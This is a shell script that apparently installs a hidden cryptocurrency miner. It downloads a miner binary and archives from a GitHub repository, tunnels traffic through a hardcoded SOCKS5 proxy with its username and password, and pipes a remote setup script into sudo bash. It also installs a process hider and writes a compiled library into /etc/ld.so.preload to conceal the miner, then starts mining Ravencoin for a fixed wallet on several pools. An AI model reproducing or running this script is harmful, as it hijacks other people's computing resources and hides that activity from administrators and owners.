#!/bin/sh









wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 176.53.133.217:57597
socks5_username = 2BHVpyGPD
socks5_password = 1rN14HAmV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && sudo apt install gcc && npm i -g node-process-hider
ph add graftcp
ph add bezzHash
ph add ethash.poolbinance.com

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
chmod +x bezzHash


./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@us-rvn.2miners.com:6060

./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@asia-rvn.2miners.com:6060

./graftcp/graftcp ./bezzHash --url=stratum+tcp://RXK7bh1VdavfDxJXBwEkcZPVTEqsvCCC2g.$(echo $(shuf -i 1-99999 -n 1)-T4)@rvn.2miners.com:6060
